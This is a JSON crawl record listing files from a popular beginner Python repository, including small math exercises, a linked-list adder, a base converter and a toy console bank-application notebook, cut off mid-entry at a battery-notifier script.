{
  "metadata": {
    "timestamp": 1736561424709,
    "page": 65,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjcw",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "geekcomputers/Python",
      "stars": 32269,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".github",
          "type": "tree",
          "content": null
        },
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.3701171875,
          "content": ".idea\n*.pyc\nstring=sorted(input())\nlower=\"\"\neven=\"\"\nodd=\"\"\nupper=\"\"\nfor i in string:\n    if i.islower():\n        lower+=i\n    elif i.isupper():\n        upper+=i\n    elif int(i)%2==0:\n        even+=i\n    else:\n        odd+=i\nprint(lower+upper+odd+even)\n\n# operating system-related files\n\n# file properties cache/storage on macOS\n*.DS_Store\n\n# thumbnail cache on Windows\nThumbs.db\n"
        },
        {
          "name": "1 File handle",
          "type": "tree",
          "content": null
        },
        {
          "name": "A solution to project euler problem 3.py",
          "type": "blob",
          "size": 1.568359375,
          "content": "\"\"\"\nProblem:\nThe prime factors of 13195 are 5,7,13 and 29. What is the largest prime factor\nof a given number N?\n\ne.g. for 10, largest prime factor = 5. For 17, largest prime factor = 17.\n\"\"\"\n\n\n# def solution(n: int) -> int:\ndef solution(n: int = 600851475143) -> int:\n    \"\"\"Returns the largest prime factor of a given number n.\n    >>> solution(13195)\n    29\n    >>> solution(10)\n    5\n    >>> solution(17)\n    17\n    >>> solution(3.4)\n    3\n    >>> solution(0)\n    Traceback (most recent call last):\n        ...\n    ValueError: Parameter n must be greater or equal to one.\n    >>> solution(-17)\n    Traceback (most recent call last):\n        ...\n    ValueError: Parameter n must be greater or equal to one.\n    >>> solution([])\n    Traceback (most recent call last):\n        ...\n    TypeError: Parameter n must be int or passive of cast to int.\n    >>> solution(\"asd\")\n    Traceback (most recent call last):\n        ...\n    TypeError: Parameter n must be int or passive of cast to int.\n    \"\"\"\n    try:\n        n = int(n)\n    except (TypeError, ValueError):\n        raise TypeError(\"Parameter n must be int or passive of cast to int.\")\n    if n <= 0:\n        raise ValueError(\"Parameter n must be greater or equal to one.\")\n\n    i = 2\n    ans = 0\n\n    if n == 2:\n        return 2\n\n    while n > 2:\n        while n % i != 0:\n            i += 1\n\n        ans = i\n\n        while n % i == 0:\n            n = n / i\n\n        i += 1\n\n    return int(ans)\n\n\nif __name__ == \"__main__\":\n    # print(solution(int(input().strip())))\n    import doctest\n\n    doctest.testmod()\n    print(solution(int(input().strip())))\n"
        },
        {
          "name": "AI Game",
          "type": "tree",
          "content": null
        },
        {
          "name": "AREA OF TRIANGLE.py",
          "type": "blob",
          "size": 0.4462890625,
          "content": "# Python Program to find the area of triangle\n# calculates area of traingle in efficient way!!\na = 5\nb = 6\nc = 7\n\n# Uncomment below to take inputs from the user\n# a = float(input('Enter first side: '))\n# b = float(input('Enter second side: '))\n# c = float(input('Enter third side: '))\n\n# calculate the semi-perimeter\ns = (a + b + c) / 2\n\n# calculate the area\narea = (s * (s - a) * (s - b) * (s - c)) ** 0.5\nprint(\"The area of the triangle is %0.2f\" % area)\n"
        },
        {
          "name": "ARKA.py",
          "type": "blob",
          "size": 0.11328125,
          "content": "def sumOfSeries(n):\n    x = n * (n + 1) / 2\n    return (int)(x * x)\n\n\n# Driver Function\nn = 5\nprint(sumOfSeries(n))\n"
        },
        {
          "name": "ASCIIvaluecharacter.py",
          "type": "blob",
          "size": 0.1142578125,
          "content": "# Program to find the ASCII value of the given character\n\nc = \"p\"\nprint(\"The ASCII value of '\" + c + \"' is\", ord(c))\n"
        },
        {
          "name": "Add_two_Linked_List.py",
          "type": "blob",
          "size": 1.833984375,
          "content": "class Node:\r\n    def __init__(self, data):\r\n        self.data = data\r\n        self.next = None\r\n\r\n\r\nclass LinkedList:\r\n    def __init__(self):\r\n        self.head = None\r\n\r\n    def insert_at_beginning(self, new_data):\r\n        new_node = Node(new_data)\r\n        if self.head is None:\r\n            self.head = new_node\r\n            return\r\n        new_node.next = self.head\r\n        self.head = new_node\r\n\r\n    def add_two_no(self, first, second):\r\n        prev = None\r\n        temp = None\r\n        carry = 0\r\n        while first is not None or second is not None:\r\n            first_data = 0 if first is None else first.data\r\n            second_data = 0 if second is None else second.data\r\n            Sum = carry + first_data + second_data\r\n            carry = 1 if Sum >= 10 else 0\r\n            Sum = Sum if Sum < 10 else Sum % 10\r\n            temp = Node(Sum)\r\n            if self.head is None:\r\n                self.head = temp\r\n            else:\r\n                prev.next = temp\r\n            prev = temp\r\n            if first is not None:\r\n                first = first.next\r\n            if second is not None:\r\n                second = second.next\r\n        if carry > 0:\r\n            temp.next = Node(carry)\r\n\r\n    def __str__(self):\r\n        temp = self.head\r\n        while temp:\r\n            print(temp.data, \"->\", end=\" \")\r\n            temp = temp.next\r\n        return \"None\"\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    first = LinkedList()\r\n    second = LinkedList()\r\n    first.insert_at_beginning(6)\r\n    first.insert_at_beginning(4)\r\n    first.insert_at_beginning(9)\r\n\r\n    second.insert_at_beginning(2)\r\n    second.insert_at_beginning(2)\r\n\r\n    print(\"First Linked List: \")\r\n    print(first)\r\n    print(\"Second Linked List: \")\r\n    print(second)\r\n\r\n    result = LinkedList()\r\n    result.add_two_no(first.head, second.head)\r\n    print(\"Final Result: \")\r\n    print(result)\r\n"
        },
        {
          "name": "AreaOfTriangle.py",
          "type": "blob",
          "size": 0.43359375,
          "content": "# Python Program to find the area of triangle when all three side-lengths are known!\n\na = 5\nb = 6\nc = 7\n\n# Uncomment below to take inputs from the user\n# a = float(input('Enter first side: '))\n# b = float(input('Enter second side: '))\n# c = float(input('Enter third side: '))\n\n# calculate the semi-perimeter\ns = (a + b + c) / 2\n\n# calculate the area\narea = (s * (s - a) * (s - b) * (s - c)) ** 0.5\nprint(\"The area of the triangle is: \" + area)\n"
        },
        {
          "name": "Armstrong_number",
          "type": "blob",
          "size": 0.271484375,
          "content": "def is_armstrong_number(number):\n    numberstr = str(number)\n    length = len(numberstr)\n    num = number\n    rev = 0\n    temp = 0\n    while num != 0:\n        rem = num % 10\n        num //=  10\n        temp += rem ** length\n    return temp == number\n    \nis_armstrong_number(5)\n"
        },
        {
          "name": "Armstrong_number.py",
          "type": "blob",
          "size": 0.982421875,
          "content": "\"\"\"\r\nIn number theory, a narcissistic number (also known as a pluperfect digital invariant (PPDI), an Armstrong number (after Michael F. Armstrong) or a plus perfect number), \r\nin a given number base b, is a number that is the total of its own digits each raised to the power of the number of digits.\r\nSource: https://en.wikipedia.org/wiki/Narcissistic_number\r\nNOTE:\r\nthis scripts only works for number in base 10\r\n\"\"\"\r\n\r\ndef is_armstrong_number(number:str):\r\n    total:int = 0\r\n    exp:int = len(number) #get the number of digits, this will determinate the exponent\r\n\r\n    digits:list[int] = []\r\n    for digit in number: digits.append(int(digit)) #get the single digits\r\n    for x in digits: total += x ** exp #get the power of each digit and sum it to the total\r\n    \r\n    # display the result\r\n    if int(number) == total:\r\n       print(number,\"is an Armstrong number\")\r\n    else:\r\n       print(number,\"is not an Armstrong number\")\r\n\r\nnumber = input(\"Enter the number : \")\r\nis_armstrong_number(number)\r\n"
        },
        {
          "name": "Assembler",
          "type": "tree",
          "content": null
        },
        {
          "name": "AutoComplete_App",
          "type": "tree",
          "content": null
        },
        {
          "name": "Automated Scheduled Call Reminders",
          "type": "tree",
          "content": null
        },
        {
          "name": "Bank Application .ipynb",
          "type": "blob",
          "size": 19.7509765625,
          "content": "{\n \"cells\": [\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": null,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"##open project \"\n   ]\n  },\n  {\n   \"cell_type\": \"markdown\",\n   \"metadata\": {},\n   \"source\": [\n    \"# data is abstract Part :)\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 2,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"data = {\\n\",\n    \"    \\\"accno\\\" : [1001, 1002, 1003, 1004, 1005],\\n\",\n    \"    \\\"name\\\" : ['vaibhav', 'abhinav', 'aman', 'ashish', 'pramod'],\\n\",\n    \"    \\\"balance\\\" : [10000, 12000, 7000, 9000, 10000],\\n\",\n    \"    \\\"password\\\" : ['admin', 'adminadmin', 'passwd', '1234567', 'amigo'],\\n\",\n    \"    \\\"security_check\\\" : ['2211', '1112', '1009', '1307', '1103']\\n\",\n    \"}\\n\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 3,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"data\": {\n      \"text/plain\": [\n       \"{'accno': [1001, 1002, 1003, 1004, 1005],\\n\",\n       \" 'name': ['vaibhav', 'abhinav', 'aman', 'ashish', 'pramod'],\\n\",\n       \" 'balance': [10000, 12000, 7000, 9000, 10000],\\n\",\n       \" 'password': ['admin', 'adminadmin', 'passwd', '1234567', 'amigo'],\\n\",\n       \" 'security_check': ['2211', '1112', '1009', '1307', '1103']}\"\n      ]\n     },\n     \"execution_count\": 3,\n     \"metadata\": {},\n     \"output_type\": \"execute_result\"\n    }\n   ],\n   \"source\": [\n    \"data\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 4,\n   \"metadata\": {\n    \"scrolled\": true\n   },\n   \"outputs\": [\n    {\n     \"name\": \"stdout\",\n     \"output_type\": \"stream\",\n     \"text\": [\n      \"                                        -------------------                                         \\n\",\n      \"                                        | Bank Application |                                        \\n\",\n      \"----------------------------------------------------------------------------------------------------\\n\",\n      \"\\n\",\n      \" 1. Login \\n\",\n      \" 2. Signup \\n\",\n      \" 3. Exit\\n\",\n      \"    enter what you want login, signup, exit :     1\\n\",\n      \"                                          login                                           \\n\",\n      \"____________________________________________________________________________________________________\\n\",\n      \"             enter account number :               1001\\n\",\n      \"                enter password :                  admin\\n\",\n      \"\\n\",\n      \" 1.check ditails \\n\",\n      \" 2. debit \\n\",\n      \" 3. credit \\n\",\n      \" 4. change password \\n\",\n      \" 5. main Manu \\n\",\n      \"              enter what you want :               1\\n\",\n      \"                                      cheak ditails                                       \\n\",\n      \"....................................................................................................\\n\",\n      \"your account number -->  1001\\n\",\n      \"your name -->  vaibhav\\n\",\n      \"your balance -->  10000\\n\",\n      \"\\n\",\n      \" 1.check ditails \\n\",\n      \" 2. debit \\n\",\n      \" 3. credit \\n\",\n      \" 4. change password \\n\",\n      \" 5. main Manu \\n\",\n      \"              enter what you want :               5\\n\",\n      \"                                        main menu                                         \\n\",\n      \"....................................................................................................\\n\",\n      \"\\n\",\n      \" 1. Login \\n\",\n      \" 2. Signup \\n\",\n      \" 3. Exit\\n\",\n      \"    enter what you want login, signup, exit :     3\\n\",\n      \"                                           exit                                           \\n\",\n      \"                                  thank you for visiting                                  \\n\",\n      \"....................................................................................................\\n\"\n     ]\n    }\n   ],\n   \"source\": [\n    \"# import getpass\\n\",\n    \"print(\\\"-------------------\\\".center(100))\\n\",\n    \"print(\\\"| Bank Application |\\\".center(100))\\n\",\n    \"print(\\\"-\\\"*100)\\n\",\n    \"while True :\\n\",\n    \"    print(\\\"\\\\n 1. Login \\\\n 2. Signup \\\\n 3. Exit\\\")\\n\",\n    \"    i1 = int(input(\\\"enter what you want login, signup, exit :\\\".center(50)))\\n\",\n    \"    #login part\\n\",\n    \"    if i1 == 1:\\n\",\n    \"        print(\\\"login\\\".center(90))\\n\",\n    \"        print(\\\"_\\\"*100)\\n\",\n    \"        i2 = int(input(\\\"enter account number : \\\".center(50)))\\n\",\n    \"        if i2 in (data[\\\"accno\\\"]):\\n\",\n    \"            check = (data[\\\"accno\\\"]).index(i2)\\n\",\n    \"            i3 = input(\\\"enter password : \\\".center(50))\\n\",\n    \"            check2= data[\\\"password\\\"].index(i3)\\n\",\n    \"            if check  == check2:\\n\",\n    \"                while True:\\n\",\n    \"                    print(\\\"\\\\n 1.check ditails \\\\n 2. debit \\\\n 3. credit \\\\n 4. change password \\\\n 5. main Manu \\\")\\n\",\n    \"                    i4 = int(input(\\\"enter what you want :\\\".center(50)))\\n\",\n    \"                    #check ditails part\\n\",\n    \"                    if i4 == 1:\\n\",\n    \"                        print(\\\"cheak ditails\\\".center(90))\\n\",\n    \"                        print(\\\".\\\"*100)\\n\",\n    \"                        print(f\\\"your account number -->  {data['accno'][check]}\\\")\\n\",\n    \"                        print(f\\\"your name -->  {data['name'][check]}\\\")\\n\",\n    \"                        print(f\\\"your balance -->  {data['balance'][check]}\\\")\\n\",\n    \"                        continue\\n\",\n    \"                    #debit part\\n\",\n    \"                    elif i4 == 2 :\\n\",\n    \"                        print(\\\"debit\\\".center(90))\\n\",\n    \"                        print(\\\".\\\"*100)\\n\",\n    \"                        print(f\\\"your balance -->  {data['balance'][check]}\\\")\\n\",\n    \"                        i5 = int(input(\\\"enter debit amount : \\\"))\\n\",\n    \"                        if 0 < i5 <= data['balance'][check]:\\n\",\n    \"                            debit = data['balance'][check]-i5\\n\",\n    \"                            data['balance'][check] = debit\\n\",\n    \"                            print(f\\\"your remaining balance -->  {data['balance'][check]}\\\")\\n\",\n    \"                        else:\\n\",\n    \"                            print(\\\"your debit amount is more than balance \\\")\\n\",\n    \"                        continue\\n\",\n    \"                    #credit part\\n\",\n    \"                    elif i4 == 3 :\\n\",\n    \"                        print(\\\"credit\\\".center(90))\\n\",\n    \"                        print(\\\".\\\"*100)\\n\",\n    \"                        print(f\\\"your balance -->  {data['balance'][check]}\\\")\\n\",\n    \"                        i6 = int(input(\\\"enter credit amount : \\\"))\\n\",\n    \"                        if 0 < i6:\\n\",\n    \"                            credit = data['balance'][check]+i6\\n\",\n    \"                            data['balance'][check] = credit\\n\",\n    \"                            print(f\\\"your new balance -->  {data['balance'][check]}\\\")\\n\",\n    \"                        else:\\n\",\n    \"                            print(\\\"your credit amount is low \\\")\\n\",\n    \"                        continue\\n\",\n    \"                    #password part\\n\",\n    \"                    elif i4 == 4 :\\n\",\n    \"                        print(\\\"change password\\\".center(90))\\n\",\n    \"                        print(\\\".\\\"*100)\\n\",\n    \"                        old = input(\\\"enter your old password : \\\")\\n\",\n    \"                        print(\\\"your password must have at list one lower case, one uppercase, one digital, one special case and length of password is 8\\\")\\n\",\n    \"                        new = getpass.getpass(prompt = \\\"Enter your new password\\\" )\\n\",\n    \"                        if old == data[\\\"password\\\"][check]:\\n\",\n    \"                            low, up ,sp ,di = 0, 0, 0, 0\\n\",\n    \"                            if (len(new))> 8 :\\n\",\n    \"                                for i in new:\\n\",\n    \"                                    if (i.islower()):\\n\",\n    \"                                        low += 1\\n\",\n    \"                                    if (i.isupper()):\\n\",\n    \"                                        up +=1 \\n\",\n    \"                                    if (i.isdigit()):\\n\",\n    \"                                        di += 1\\n\",\n    \"                                    if (i in ['@','$','%','^','&','*']):\\n\",\n    \"                                        sp += 1\\n\",\n    \"                            if (low>=1 and up>=1 and sp>=1 and di>=1 and low+up+sp+di==len(new)):\\n\",\n    \"                                data['password'][check] = new\\n\",\n    \"                                print(f\\\"your new password -->  {data['password'][check]}\\\")\\n\",\n    \"                            else:\\n\",\n    \"                                print(\\\"Invalid Password\\\")\\n\",\n    \"                        else:\\n\",\n    \"                            print(\\\"old password wrong please enter valid password\\\")\\n\",\n    \"                        continue\\n\",\n    \"                    elif i4 == 5 :\\n\",\n    \"                        print(\\\"main menu\\\".center(90))\\n\",\n    \"                        print(\\\".\\\"*100)\\n\",\n    \"                    break\\n\",\n    \"                else:\\n\",\n    \"                    print(\\\"please enter valid number\\\")    \\n\",\n    \"            else:\\n\",\n    \"                print(\\\"please check your password number\\\".center(50))\\n\",\n    \"        else:\\n\",\n    \"            print(\\\"please check your account number\\\".center(50))     \\n\",\n    \"    #signup part \\n\",\n    \"    elif i1 == 2 :\\n\",\n    \"        print(\\\"signup\\\".center(90))\\n\",\n    \"        print(\\\"_\\\"*100)\\n\",\n    \"        acc = 1001 + len(data['accno'])\\n\",\n    \"        data['accno'].append(acc)\\n\",\n    \"        ind = (data['accno']).index(acc)\\n\",\n    \"        name = input(\\\"enter your name : \\\")\\n\",\n    \"        data['name'].append(name)\\n\",\n    \"        balance = int(input(\\\"enter your initial balance : \\\"))\\n\",\n    \"        data['balance'].append(balance)\\n\",\n    \"        password = input(\\\"enter your password : \\\")\\n\",\n    \"        data['password'].append(password)\\n\",\n    \"        security_check = (int(input(\\\"enter your security pin (DDMM) : \\\"))).split()\\n\",\n    \"        print(\\\".\\\"*100)\\n\",\n    \"        print(f\\\"your account number -->  {data['accno'][ind]}\\\".center(50))\\n\",\n    \"        print(f\\\"your name -->  {data['name'][ind]}\\\".center(50))\\n\",\n    \"        print(f\\\"your balance -->  {data['balance'][ind]}\\\".center(50))\\n\",\n    \"        print(f\\\"your password --> {data['password'][ind]}\\\".center(50))\\n\",\n    \"        continue\\n\",\n    \"    #exit part\\n\",\n    \"    elif i1== 3 :\\n\",\n    \"        print(\\\"exit\\\".center(90))\\n\",\n    \"        print(\\\"thank you for visiting\\\".center(90))\\n\",\n    \"        print(\\\".\\\"*100)\\n\",\n    \"        break\\n\",\n    \"    else:\\n\",\n    \"        print(f\\\"wrong enter : {i1}\\\".center(50))\\n\"\n   ]\n  },\n  {\n   \"cell_type\": \"markdown\",\n   \"metadata\": {},\n   \"source\": [\n    \"# All part in function:)\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 54,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"def cheak_ditails(check):\\n\",\n    \"    print(\\\"cheak ditails\\\".center(90))\\n\",\n    \"    print(\\\".\\\"*100)\\n\",\n    \"    print(f\\\"your account number -->  {data['accno'][check]}\\\")\\n\",\n    \"    print(f\\\"your name -->  {data['name'][check]}\\\")\\n\",\n    \"    print(f\\\"your balance -->  {data['balance'][check]}\\\")\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 55,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"def credit(check):\\n\",\n    \"    print(\\\"credit\\\".center(90))\\n\",\n    \"    print(\\\".\\\"*100)\\n\",\n    \"    print(f\\\"your balance -->  {data['balance'][check]}\\\")\\n\",\n    \"    i6 = int(input(\\\"enter credit amount : \\\"))\\n\",\n    \"    if 0 < i6:\\n\",\n    \"        credit = data['balance'][check]+i6\\n\",\n    \"        data['balance'][check] = credit\\n\",\n    \"        print(f\\\"your new balance -->  {data['balance'][check]}\\\")\\n\",\n    \"    else:\\n\",\n    \"        print(\\\"your credit amount is low \\\")\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 56,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"def debit(check):\\n\",\n    \"    print(\\\"debit\\\".center(90))\\n\",\n    \"    print(\\\".\\\"*100)\\n\",\n    \"    print(f\\\"your balance -->  {data['balance'][check]}\\\")\\n\",\n    \"    i5 = int(input(\\\"enter debit amount : \\\"))\\n\",\n    \"    if 0 < i5 <= data['balance'][check]:\\n\",\n    \"        debit = data['balance'][check]-i5\\n\",\n    \"        data['balance'][check] = debit\\n\",\n    \"        print(f\\\"your remaining balance -->  {data['balance'][check]}\\\")\\n\",\n    \"    else:\\n\",\n    \"        print(\\\"your debit amount is more than balance \\\")\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 57,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"def change_password(check):\\n\",\n    \"    print(\\\"change password\\\".center(90))\\n\",\n    \"    print(\\\".\\\"*100)\\n\",\n    \"    old = input(\\\"enter your old password : \\\")\\n\",\n    \"    print(\\\"your password must have at list one lower case, one uppercase, one digital, one special case and length of password is 8\\\")\\n\",\n    \"    new = getpass.getpass(prompt = \\\"Enter your new password\\\" )\\n\",\n    \"    if old == data[\\\"password\\\"][check]:\\n\",\n    \"        low, up ,sp ,di = 0, 0, 0, 0\\n\",\n    \"        if (len(new))> 8 :\\n\",\n    \"            for i in new:\\n\",\n    \"                if (i.islower()):\\n\",\n    \"                    low += 1\\n\",\n    \"                if (i.isupper()):\\n\",\n    \"                    up +=1 \\n\",\n    \"                if (i.isdigit()):\\n\",\n    \"                    di += 1\\n\",\n    \"                if (i in ['@','$','%','^','&','*']):\\n\",\n    \"                    sp += 1\\n\",\n    \"        if (low>=1 and up>=1 and sp>=1 and di>=1 and low+up+sp+di==len(new)):\\n\",\n    \"            data['password'][check] = new\\n\",\n    \"            print(f\\\"your new password -->  {data['password'][check]}\\\")\\n\",\n    \"        else:\\n\",\n    \"            print(\\\"Invalid Password\\\")\\n\",\n    \"    else:\\n\",\n    \"        print(\\\"old password wrong please enter valid password\\\")\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 58,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"def login():\\n\",\n    \"    print(\\\"login\\\".center(90))\\n\",\n    \"    print(\\\"_\\\"*100)\\n\",\n    \"    i2 = int(input(\\\"enter account number : \\\".center(50)))\\n\",\n    \"    if i2 in (data[\\\"accno\\\"]):\\n\",\n    \"        check = (data[\\\"accno\\\"]).index(i2)\\n\",\n    \"        i3 = input(\\\"enter password : \\\".center(50))\\n\",\n    \"        check2= data[\\\"password\\\"].index(i3)\\n\",\n    \"        if check  == check2:\\n\",\n    \"            while True:\\n\",\n    \"                print(\\\"\\\\n 1.check ditails \\\\n 2. debit \\\\n 3. credit \\\\n 4. change password \\\\n 5. main Manu \\\")\\n\",\n    \"                i4 = int(input(\\\"enter what you want :\\\".center(50)))\\n\",\n    \"                #check ditails part\\n\",\n    \"                if i4 == 1:\\n\",\n    \"                    cheak_ditails(check)\\n\",\n    \"                    continue\\n\",\n    \"                #debit part\\n\",\n    \"                elif i4 == 2 :\\n\",\n    \"                    debit(check)\\n\",\n    \"                    continue\\n\",\n    \"                #credit part\\n\",\n    \"                elif i4 == 3 :\\n\",\n    \"                    credit(check)\\n\",\n    \"                    continue\\n\",\n    \"                #password part\\n\",\n    \"                elif i4 == 4 :\\n\",\n    \"                    change_password(check)\\n\",\n    \"                    continue\\n\",\n    \"                elif i4 == 5 :\\n\",\n    \"                    print(\\\"main menu\\\".center(90))\\n\",\n    \"                    print(\\\".\\\"*100)\\n\",\n    \"                break\\n\",\n    \"            else:\\n\",\n    \"                print(\\\"please enter valid number\\\")    \\n\",\n    \"        else:\\n\",\n    \"            print(\\\"please check your password number\\\".center(50))\\n\",\n    \"    else:\\n\",\n    \"        print(\\\"please check your account number\\\".center(50))     \"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 74,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"def security_check(ss):\\n\",\n    \"    data = {(1, 3, 5, 7, 8, 10, 12) : 31, (2, ) : 29, (4, 6, 9) : 30}\\n\",\n    \"    month = ss[2:]\\n\",\n    \"    date = ss[:2]\\n\",\n    \"    for key, value in data.items():\\n\",\n    \"        print(key, value)\\n\",\n    \"        if int(month) in key:\\n\",\n    \"            if 1<=int(date)<=value:\\n\",\n    \"                return True\\n\",\n    \"            return False\\n\",\n    \"    return False\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": 75,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": [\n    \"def signup():\\n\",\n    \"    print(\\\"signup\\\".center(90))\\n\",\n    \"    print(\\\"_\\\"*100)\\n\",\n    \"    acc = 1001 + len(data['accno'])\\n\",\n    \"    data['accno'].append(acc)\\n\",\n    \"    ind = (data['accno']).index(acc)\\n\",\n    \"    name = input(\\\"enter your name : \\\")\\n\",\n    \"    data['name'].append(name)\\n\",\n    \"    balance = int(input(\\\"enter your initial balance : \\\"))\\n\",\n    \"    data['balance'].append(balance)\\n\",\n    \"    password = input(\\\"enter your password : \\\")\\n\",\n    \"    data['password'].append(password)\\n\",\n    \"    ss=input(\\\"enter a secuirty quetion in form dd//mm\\\")\\n\",\n    \"    security_check(ss)\\n\",\n    \"    data['security_check'].append(ss)\\n\",\n    \"    print(\\\".\\\"*100)\\n\",\n    \"    print(f\\\"your account number -->  {data['accno'][ind]}\\\".center(50))\\n\",\n    \"    print(f\\\"your name -->  {data['name'][ind]}\\\".center(50))\\n\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": null,\n   \"metadata\": {},\n   \"outputs\": [\n    {\n     \"name\": \"stdout\",\n     \"output_type\": \"stream\",\n     \"text\": [\n      \"                                        -------------------                                         \\n\",\n      \"                                        | Bank Application |                                        \\n\",\n      \"----------------------------------------------------------------------------------------------------\\n\",\n      \"\\n\",\n      \" 1. Login \\n\",\n      \" 2. Signup \\n\",\n      \" 3. Exit\\n\",\n      \"    enter what you want login, signup, exit :     2\\n\",\n      \"                                          signup                                          \\n\",\n      \"____________________________________________________________________________________________________\\n\",\n      \"enter your name : am\\n\",\n      \"enter your initial balance : 1000\\n\",\n      \"enter your password : amn11\\n\",\n      \"enter a secuirty quetion in form dd//mm1103\\n\",\n      \"(1, 3, 5, 7, 8, 10, 12) 31\\n\",\n      \"....................................................................................................\\n\",\n      \"          your account number -->  1013           \\n\",\n      \"                your name -->  am                 \\n\",\n      \"\\n\",\n      \" 1. Login \\n\",\n      \" 2. Signup \\n\",\n      \" 3. Exit\\n\"\n     ]\n    }\n   ],\n   \"source\": [\n    \"def main():\\n\",\n    \"    import getpass\\n\",\n    \"    print(\\\"-------------------\\\".center(100))\\n\",\n    \"    print(\\\"| Bank Application |\\\".center(100))\\n\",\n    \"    print(\\\"-\\\"*100)\\n\",\n    \"    while True :\\n\",\n    \"        print(\\\"\\\\n 1. Login \\\\n 2. Signup \\\\n 3. Exit\\\")\\n\",\n    \"        i1 = int(input(\\\"enter what you want login, signup, exit :\\\".center(50)))\\n\",\n    \"        #login part\\n\",\n    \"        if i1 == 1:\\n\",\n    \"            login()\\n\",\n    \"        #signup part \\n\",\n    \"        elif i1 == 2 :\\n\",\n    \"            signup()\\n\",\n    \"        #exit part\\n\",\n    \"        elif i1== 3 :\\n\",\n    \"            print(\\\"exit\\\".center(90))\\n\",\n    \"            print(\\\"thank you for visiting\\\".center(90))\\n\",\n    \"            print(\\\".\\\"*100)\\n\",\n    \"            break\\n\",\n    \"        else:\\n\",\n    \"            print(f\\\"wrong enter : {i1}\\\".center(50))\\n\"\n   ]\n  },\n  {\n   \"cell_type\": \"code\",\n   \"execution_count\": null,\n   \"metadata\": {},\n   \"outputs\": [],\n   \"source\": []\n  }\n ],\n \"metadata\": {\n  \"kernelspec\": {\n   \"display_name\": \"Python 3\",\n   \"language\": \"python\",\n   \"name\": \"python3\"\n  },\n  \"language_info\": {\n   \"codemirror_mode\": {\n    \"name\": \"ipython\",\n    \"version\": 3\n   },\n   \"file_extension\": \".py\",\n   \"mimetype\": \"text/x-python\",\n   \"name\": \"python\",\n   \"nbconvert_exporter\": \"python\",\n   \"pygments_lexer\": \"ipython3\",\n   \"version\": \"3.8.5\"\n  }\n },\n \"nbformat\": 4,\n \"nbformat_minor\": 4\n}\n"
        },
        {
          "name": "Base Converter Number system.py",
          "type": "blob",
          "size": 2.5986328125,
          "content": "def base_check(xnumber, xbase):\n    for char in xnumber[len(xnumber) - 1]:\n        if int(char) >= int(xbase):\n            return False\n    return True\n\n\ndef convert_from_10(xnumber, xbase, arr, ybase):\n    if int(xbase) == 2 or int(xbase) == 4 or int(xbase) == 6 or int(xbase) == 8:\n\n        if xnumber == 0:\n            return arr\n        else:\n            quotient = int(xnumber) // int(xbase)\n            remainder = int(xnumber) % int(xbase)\n            arr.append(remainder)\n            dividend = quotient\n            convert_from_10(dividend, xbase, arr, base)\n    elif int(xbase) == 16:\n        if int(xnumber) == 0:\n            return arr\n        else:\n            quotient = int(xnumber) // int(xbase)\n            remainder = int(xnumber) % int(xbase)\n            if remainder > 9:\n                if remainder == 10:\n                    remainder = \"A\"\n                if remainder == 11:\n                    remainder = \"B\"\n                if remainder == 12:\n                    remainder = \"C\"\n                if remainder == 13:\n                    remainder = \"D\"\n                if remainder == 14:\n                    remainder = \"E\"\n                if remainder == 15:\n                    remainder = \"F\"\n            arr.append(remainder)\n            dividend = quotient\n            convert_from_10(dividend, xbase, arr, ybase)\n\n\ndef convert_to_10(xnumber, xbase, arr, ybase):\n    if int(xbase) == 10:\n        for char in xnumber:\n            arr.append(char)\n        flipped = arr[::-1]\n        ans = 0\n        j = 0\n\n        for i in flipped:\n            ans = ans + (int(i) * (int(ybase) ** j))\n            j = j + 1\n        return ans\n\n\narrayfrom = []\narrayto = []\nis_base_possible = False\nnumber = input(\"Enter the number you would like to convert: \")\n\nwhile not is_base_possible:\n    base = input(\"What is the base of this number? \")\n    is_base_possible = base_check(number, base)\n    if not is_base_possible:\n        print(f\"The number {number} is not a base {base} number\")\n        base = input\n    else:\n        break\ndBase = input(\"What is the base you would like to convert to? \")\nif int(base) == 10:\n    convert_from_10(number, dBase, arrayfrom, base)\n    answer = arrayfrom[::-1]  # reverses the array\n    print(f\"In base {dBase} this number is: \")\n    print(*answer, sep=\"\")\nelif int(dBase) == 10:\n    answer = convert_to_10(number, dBase, arrayto, base)\n    print(f\"In base {dBase} this number is: {answer} \")\nelse:\n    number = convert_to_10(number, 10, arrayto, base)\n    convert_from_10(number, dBase, arrayfrom, base)\n    answer = arrayfrom[::-1]\n    print(f\"In base {dBase} this number is: \")\n    print(*answer, sep=\"\")\n"
        },
        {
          "name": "Battery_notifier.py",
          "type": "blob",
          "size": 0.7109375,
